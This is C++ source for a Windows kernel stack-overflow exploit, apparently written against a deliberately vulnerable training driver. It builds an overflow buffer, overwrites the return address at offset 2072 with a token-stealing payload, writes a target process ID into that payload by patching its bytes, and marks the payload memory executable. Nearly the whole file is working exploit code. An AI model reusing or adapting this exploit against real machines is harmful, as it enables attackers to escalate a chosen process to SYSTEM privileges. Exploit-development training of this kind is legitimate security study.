
#include "payload_stack_overflow.h"

namespace payload_stack_overflow {
	
	bool PayloadStackOverFlow :: init() {
		auto b_res = false;
		if (process_is_running()) {
			// 1 Allocate buffer, 
			// 2 fill buffer with 0x49 value
			// 3 set RIP offset as a address of payload 
			// 4 grant EXECUTE permission to allow payload to be executed
			_buffer = (byte*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, _bufferSz);
			if (_buffer) {
				memset(_buffer, /*0x49*/ (int)'I', _bufferSz);

				const auto rip_offset = 2072; // = RIP - register				// [Option] we can also control RSP register
				ULONG* payload_addr = (ULONG*)(_buffer + rip_offset);			//const DWORD rip_offset = 2080; // = RSP - register
				*(__int64*)payload_addr = (__int64)&TokenStealingPayloadWin10;	//memset(input_buffer + 2080, 0x42, 8);

				if (set_pid_to_payload() && 
					set_memory_permission(PAGE_EXECUTE_READ)) {
					b_res = true;
				}
			}
		}
		else {
			cout << "There is no active process with the UniqueProcessId = " << _targetPid << endl;
		}
		return b_res;
	}

	void PayloadStackOverFlow :: deinit() {
		// Restore permissions and free memory
		if (_buffer) {
			if (set_memory_permission(PAGE_READWRITE)) {
				
				// Restore default 'PID' value in the payload
				_targetPid = g_dwDefaultPid;
				set_pid_to_payload();

				HeapFree(GetProcessHeap(), 0, _buffer);
			}
		}
	}

	bool PayloadStackOverFlow :: process_is_running() {
		auto b_res = false;
		if (_targetPid){
			auto proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			if (proc_snap != INVALID_HANDLE_VALUE) {
				PROCESSENTRY32 entry = { 0 };
				memset(&entry, 0, sizeof(PROCESSENTRY32));
				entry.dwSize = sizeof(PROCESSENTRY32);

				if (Process32First(proc_snap, &entry)) {
					do {
						if (_targetPid == entry.th32ProcessID) {
							b_res = true;
							break;
						}
					} while (!((Process32Next(proc_snap, &entry) == FALSE) && (ERROR_NO_MORE_FILES == GetLastError())));
				}
				CloseHandle(proc_snap);
			}
		}
		return b_res;
	}

	bool PayloadStackOverFlow :: set_memory_permission(DWORD flNewProtect) {
		auto b_res = false;
		auto handle_process = GetCurrentProcess();
		MEMORY_BASIC_INFORMATION info = { 0 };
		DWORD old_protect = 0;

		for (unsigned char *p = NULL;
			VirtualQueryEx(handle_process, p, &info, sizeof(info)) == sizeof(info);
			p += info.RegionSize){
			if (((size_t)info.BaseAddress <= (size_t)_funcAddr) &&
				((size_t)_funcAddr <= ((size_t)info.BaseAddress + info.RegionSize))) {
				b_res = 
					(0 != VirtualProtectEx(handle_process, 
						info.BaseAddress, info.RegionSize, flNewProtect, &old_protect)) ;
				break;
			}
		}
		return b_res;
	}

	bool PayloadStackOverFlow :: set_pid_to_payload() {
		auto b_res = false;
		// Retrieve function addr: from JMP ADDR we get ADDR
		// e.g.
		if (!_funcAddr) {
			byte* jmp_trampoline = (byte*)TokenStealingPayloadWin10;
			if ((jmp_trampoline[0] == 0xE9) && (jmp_trampoline[5] == 0xE9)) {
				_funcAddr = jmp_trampoline +
					jmp_trampoline[1] +
					jmp_trampoline[2] * 0x100 +
					jmp_trampoline[3] * 0x100 * 0x100 +
					5;
				// The offset is relative to the end of the JMP instruction and not the beginning.
				// CURRENT_RVA: jmp (DESTINATION_RVA - CURRENT_RVA - 5 [sizeof(E9 xx xx xx xx)])
				// https://stackoverflow.com/questions/7609549/calculating-jmp-instructions-address
			}
		}

		if (!_pidOffset) {
			for (int i = 0; i < 0x64; i++) {
				if ((g_bDefaultPid[0] == _funcAddr[i]) &&
					(g_bDefaultPid[1] == _funcAddr[i + 1]) &&
					(g_bDefaultPid[2] == _funcAddr[i + 2]) &&
					(g_bDefaultPid[3] == _funcAddr[i + 3])) {
					_pidOffset = i;
					break;
				}
			}
		}

		if (_funcAddr && _pidOffset && _targetPid) {
			__try {
				_funcAddr[_pidOffset] = (byte)(_targetPid & 0x000000FF);
				_funcAddr[_pidOffset + 1] = (byte)((_targetPid & 0x0000FF00) >> 8);
				_funcAddr[_pidOffset + 2] = (byte)((_targetPid & 0x00FF0000) >> 8 * 2);
				_funcAddr[_pidOffset + 3] = (byte)((_targetPid & 0xFF000000) >> 8 * 3);
				b_res = true;
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				b_res = false;
			}
		}
		return b_res;
	}
}